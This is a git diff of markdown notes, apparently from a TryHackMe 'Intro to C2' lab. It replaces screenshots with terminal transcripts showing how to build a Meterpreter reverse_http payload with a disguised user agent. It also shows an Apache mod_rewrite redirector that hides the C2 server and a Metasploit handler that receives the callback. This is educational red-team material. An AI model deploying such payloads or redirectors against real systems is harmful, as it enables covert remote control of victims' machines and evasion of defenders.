@@ -487,11 +487,68 @@ Before we dive into configuring a redirector, we must first understand how one i
 
 Note: If you are using the Attack Box, there is already a service running on port 80 - you must change the default port that Apache listens on in /etc/apache2/ports.conf. You must do this before starting the Apache 2 service, or it will fail to start.  
 You can install apache 2 and enable it with the following commands:  
-<img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Intro%20to%20C2_47.png" width="40%" height="40%">
-<img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Intro%20to%20C2_48.png" width="75%" height="75%">  
+```
+root@kali$ apt install apache2
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+The following packages were automatically installed and are no longer required:
+  python-bs4 python-chardet python-dicttoxml python-dnspython python-html5lib
+  python-jsonrpclib python-lxml python-mechanize python-olefile python-pypdf2
+  python-slowaes python-webencodings python-xlsxwriter
+Use 'apt autoremove' to remove them.
+The following additional packages will be installed:
+  apache2-bin apache2-data apache2-utils libaprutil1-dbd-sqlite3
+  libaprutil1-ldap
+Suggested packages:
+  apache2-doc apache2-suexec-pristine | apache2-suexec-custom
+The following NEW packages will be installed
+  apache2 apache2-bin apache2-data apache2-utils libaprutil1-dbd-sqlite3
+  libaprutil1-ldap
+0 to upgrade, 6 to newly install, 0 to remove and 416 not to upgrade.
+
+Processing triggers for systemd (237-3ubuntu10.42) ...
+Processing triggers for man-db (2.8.3-2ubuntu0.1) ...
+Processing triggers for ufw (0.36-0ubuntu0.18.04.1) ...
+Processing triggers for ureadahead (0.100.0-21) ...
+
+root@kali$ a2enmod rewrite && a2enmod proxy && a2enmod proxy_http && a2enmod headers && systemctl start apache2 && systemctl status apache2
+Enabling module rewrite.
+To activate the new configuration, you need to run:
+  systemctl restart apache2
+Enabling module proxy.
+To activate the new configuration, you need to run:
+  systemctl restart apache2
+Enabling module proxy_http.
+To activate the new configuration, you need to run:
+  systemctl restart apache2
+Enabling module headers.
+To activate the new configuration, you need to run:
+  systemctl restart apache2
+
+● apache2.service - The Apache HTTP Server
+     Loaded: loaded (/lib/systemd/system/apache2.service; disabled; vendor preset: disabled)
+     Active: active (running) since Thu 2022-02-10 23:17:08 EST; 7ms ago
+       Docs: https://httpd.apache.org/docs/2.4/
+    Process: 4149 ExecStart=/usr/sbin/apachectl start (code=exited, status=0/SUCCESS)
+   Main PID: 4153 (apache2)
+      Tasks: 1 (limit: 19072)
+     Memory: 6.0M
+        CPU: 19ms
+     CGroup: /system.slice/apache2.service
+             └─4153 /usr/sbin/apache2 -k start
+```
 Using Meterpreter, we have the ability to configure various aspects of the HTTP Request, for example, the User-Agent. It is very common for a threat actor to make a slight adjustment to the User-Agent in their C2 HTTP/HTTPS payloads. It's in every HTTP request, and they all more or less look the same, and there is a very good chance a security analyst may overlook a modified user agent string. For this demonstration, we will generate a Meterpreter Reverse HTTP payload using MSFvenom; then we will inspect the HTTP request in Wireshark. 
 #### Generating a Payload with Modified Headers -
-<img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Intro%20to%20C2_49.png" width="75%" height="75%">  
+```
+root@kali$ msfvenom -p windows/meterpreter/reverse_http LHOST=tun0 LPORT=80 HttpUserAgent=NotMeterpreter -f exe -o shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 454 bytes
+Final size of exe file: 73802 bytes
+Saved as: shell.exe
+```
 After generating the modified executable and transferring it to a victim, open up Wireshark on your host and use the HTTP filter to only view HTTP requests. After it's started capturing packets, execute the binary on the victim system. You will notice an HTTP request come in with our modified User-Agent.  
 <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Intro%20to%20C2_50.png" width="100%" height="100%">  
 
@@ -499,16 +556,78 @@ Packet Capture of the modified HTTP Payload with Meterpreter
 Now that we have a field we can control in the HTTP Request, let's create an Apache2 mod_rewrite rule that filters on the user agent "NotMeterpreter" and forward it to our Metasploit C2 Server.
 #### Modifying the Apache Config File - 
 This section may sound intimidating but is actually quite easy; we will be taking the default Apache config and modifying it to our advantage. On Debian based systems, the default config can be found at `/etc/apache2/sites-available/000-default.conf`.
-<img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Intro%20to%20C2_51.png" width="50%" height="50%">  
+```
+root@kali$  cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'
+<VirtualHost *:80>
+
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+
+        <Directory>
+                AllowOverride All
+        </Directory>
+
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+</VirtualHost>
+```
 Now that we have a general idea of the Apache2 Config file is structured, we must add a few lines to the config file to enable the Rewrite Engine, add a rewrite condition, and lastly, pass through the Apache 2 Proxy. This sounds fairly complex, but it's quite simple.  
 To enable the Rewrite Engine, we must add [RewriteEngine](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html) On onto a new line in the VirtualHost section.  
 Now we will be using a Rewrite Condition targeting the HTTP User-Agent. For a complete list of HTTP Request Targets, see the [mod_rewrite documentation](https://httpd.apache.org/docs/2.4/mod/mod_rewrite.html) on Apache.org. Because we only want to match the User-Agent "NotMeterpreter", we need to use some basic Regular Expressions to capture this; adding a ^ signals the beginning of a string and a $ at the end of the series, giving us with "^NotMeterpreter$". This Regex will only capture the NotMeterpreter User-Agent. We can add this line `RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"` to our config to (as previously stated) only allow HTTP Requests with the NotMeterpreter user agent to access Metasploit.  
 Lastly, we must forward the request through Apache2, through our proxy, to Metasploit. To do this, we must use the ProxyPass feature of Apache's [mod_proxy module](https://httpd.apache.org/docs/2.4/howto/reverse_proxy.html). To do this, we just need to specify the base URI that the request will be forwarded to (in our case, we just need "/"), and the target we want to forward the request to. This will vary from setup to set up, but this IP Address will be your C2 server. In the lab scenario, it will be localhost and port that Metasploit is listening on. This will give us a full config file that looks like so:  
-<img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Intro%20to%20C2_52.png" width="50%" height="50%">  
+```
+root@kali$  cat /etc/apache2/sites-available/000-default.conf  | grep -v '#'
+
+<VirtualHost *:80>
+
+	ServerAdmin webmaster@localhost
+	DocumentRoot /var/www/html
+
+	RewriteEngine On
+	RewriteCond %{HTTP_USER_AGENT} "^NotMeterpreter$"
+	ProxyPass "/" "http://localhost:8080/"
+
+	<Directory>
+		AllowOverride All
+	</Directory>
+
+	ErrorLog ${APACHE_LOG_DIR}/error.log
+	CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+</VirtualHost>
+```
 #### Setting Up Exploit/Multi/Handler
 To set up Meterpreter properly, we need to make a few modifications; We must set our LHOST argument to the incoming interface that we are expecting connections from, in our lab; this will be 127.0.0.1. In the real world, this will be your public interface that your Redirector will be connecting to (aka your Public IP Address), and the LPORT will be whatever you like. For the lab, we will be using TCP/8080; this can be whatever you like in production. As always, the best practice is to run services over their standard protocols, so HTTP should run on port 80, and HTTPS should run on port 443. These options will also need to be duplicated for ReverseListenerBindAddress and ReverseListenerBindPort.  
 Next, we need to set up OverrideLHOST - This value will be your redirector's IP Address or Domain Name. After that, we need to set the OverrideLPORT; this will be the port that the HTTP or HTTPS is running on, on your Redirector. Lastly, we must set the OverrideRequestHost to true. This will make Meterpreter respond with the OverrideHost information, so all queries go through the Redirector and not your C2 server. Now that you understand what must be configured, let's dive into it:  
-<img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Intro%20to%20C2_53.png" width="75%" height="75%">  
+```
+root@kali$ msfconsole
+msf6 > use exploit/multi/handler 
+[*] Using configured payload generic/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
+payload => windows/meterpreter/reverse_http
+msf6 exploit(multi/handler) > set LHOST 127.0.0.1
+LHOST => 127.0.0.1
+msf6 exploit(multi/handler) > set LPORT 8080
+LPORT => 8080
+msf6 exploit(multi/handler) > set ReverseListenerBindAddress 127.0.0.1
+ReverseListenerBindAddress => 127.0.0.1
+msf6 exploit(multi/handler) > set ReverseListenerBindPort 8080
+ReverseListenerBindPort => 8080
+msf6 exploit(multi/handler) > set OverrideLHOST 192.168.0.44
+OverrideLHOST => 192.168.0.44
+msf6 exploit(multi/handler) > set OverrideLPORT 80
+OverrideLPORT => 80
+msf6 exploit(multi/handler) > set HttpUserAgent NotMeterpreter
+HttpUserAgent => NotMeterpreter
+msf6 exploit(multi/handler) > set OverrideRequestHost true
+OverrideRequestHost => true
+msf6 exploit(multi/handler) > run
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started HTTP reverse handler on http://127.0.0.1:8080
+[*] http://127.0.0.1:8080 handling request from 127.0.0.1; (UUID: zfhp2nwt) Staging x86 payload (176220 bytes) ...
+[*] Meterpreter session 3 opened (127.0.0.1:8080 -> 127.0.0.1 ) at 2022-02-11 02:09:24 -0500
+```
 After this has all been set up, running your Meterpreter Reverse Shell should now proxy all communications through your Redirector! For awareness, the diagram below is how our Redirector is set up in our lab; as a reminder, in engagements, you will want to use multiple hosts and DNS records instead of IP Addresses.   
 <img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Intro%20to%20C2_54.png" width="50%" height="50%">  
 
